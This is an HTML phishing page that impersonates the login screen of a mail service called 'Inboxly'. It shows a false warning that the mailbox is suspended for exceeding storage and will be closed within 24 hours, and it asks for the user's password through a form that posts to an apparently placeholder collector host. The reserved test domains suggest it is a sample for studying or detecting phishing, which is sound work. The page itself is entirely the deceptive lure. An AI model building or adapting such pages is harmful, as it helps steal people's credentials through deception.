<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Mailbox verification</title><style>*{box-sizing:border-box}body{margin:0;font-family:-apple-system,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;color:#1f2328;background:#f6f7f9}.mt{background:#fff;border-bottom:1px solid #e0e0e0;padding:10px 20px;display:flex;gap:16px;align-items:center}.mt b{color:#d93025;font-size:20px}.ov{position:fixed;inset:0;background:rgba(32,33,36,.6);display:flex;align-items:center;justify-content:center}.lg{width:400px;background:#fff;border-radius:8px;padding:36px 40px;box-shadow:0 8px 30px rgba(0,0,0,.3)}.lg h2{font-weight:400;margin:0 0 6px}.warn{background:#fef7e0;color:#b06000;border-radius:6px;padding:10px;font-size:13px;margin:12px 0}input{width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:15px;margin:6px 0}.nx{float:right;background:#1a73e8;color:#fff;border:0;border-radius:4px;padding:10px 22px;margin-top:10px}</style></head>
<body>
<div class="mt"><b>Inboxly</b><span>Mail</span></div><div class="ov"><form class="lg" action="https://collector.example.invalid/p" method="post"><h2>Confirm your account</h2><p>you@company.test</p><div class="warn">Your mailbox has been suspended for exceeding storage. Your account will be closed within 24 hours unless you confirm ownership.</div><label for="pw">Password</label><input id="pw" type="password" placeholder="Enter your password"><button class="nx" type="button">Next</button></form></div>
</body></html>
